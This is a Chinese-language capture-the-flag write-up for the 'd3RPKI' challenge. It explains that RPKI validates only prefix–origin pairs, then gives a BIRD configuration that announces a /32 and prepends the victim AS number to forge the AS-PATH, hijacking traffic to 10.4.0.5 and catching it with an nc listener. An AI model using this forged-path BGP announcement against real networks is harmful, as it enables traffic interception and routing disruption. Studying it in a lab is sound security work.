# d3RPKI

## 题目简述

这道题实际考验选手对 RPKI 的理解，RPKI 是一种路由安全机制，用来校验某个CIDR 是否属于某个自治域，但他并没有验证地址块宣告来源的可靠性。（实际上后者在真实互联网上目前更多用 AS-SET 以及信誉来保证）阅读题目后我们发现要获取 flag 需要劫持 10.4.0.5 这个 IP，这个 IP 由 4211110004所有，因此我们需要假装我们和 4211110004 有一个 Peer 并告诉 10.0.0.1 可以通过我们这里抵达 10.4.0.5

## 解题过程

```conf
...
protocol static {
    ipv4 {
        table BGP_table;
        import all;
        export none;
    };
    route 10.2.0.0/24 reject;
    ###!!!
    route 10.4.0.5/32 reject;
}
...
template bgp BGP_peers {
    ipv4 {
        table BGP_table;
        import filter{
            ###!!!
            if net = 10.4.0.0/24 then reject;
            if roa_check(r4, net, bgp_path.last) !~ [ROA_VALID] then {
                print "ROA check failed for ", net, " ASN ", bgp_path.last;
                reject;
            }
            accept;
        };
        export filter {
            ###!!!
            if net = 10.4.0.5/32 then {
                bgp_path.prepend(4211110004);
            }
            if source ~ [RTS_STATIC, RTS_BGP] then accept;
            reject;
        };
    };
}
...
```

BIRD 配置片段如上，在 static 块中添加了对 10.4.0.5/32 这个地址块随后将其导入到主表再从主表导出发送到上游，在导出时通过 bgp_path.prepend 修改 AS-PATH 伪造宣告。完成路由劫持后，可以在 lo 口绑定一个 10.4.0.5 并通过环境预装的 nc 监听来获取flag。

## 方法总结

- 核心技巧：RPKI 只验证前缀和 origin AS 的授权关系，不保证宣告路径本身可信；可以通过伪造 peer 和 AS-PATH 让目标把流量导向自己。
- 识别信号：题目给出 BIRD 配置、`roa_check`、`bgp_path.prepend`、特定目标 IP 和 AS 号时，应从路由宣告和路径伪造角度思考。
- 复用要点：配置里需要把目标 `/32` 静态路由导入 BGP 表，并在 export filter 中 prepend 目标 AS；劫持成功后本机绑定目标 IP 并监听服务即可接收流量。
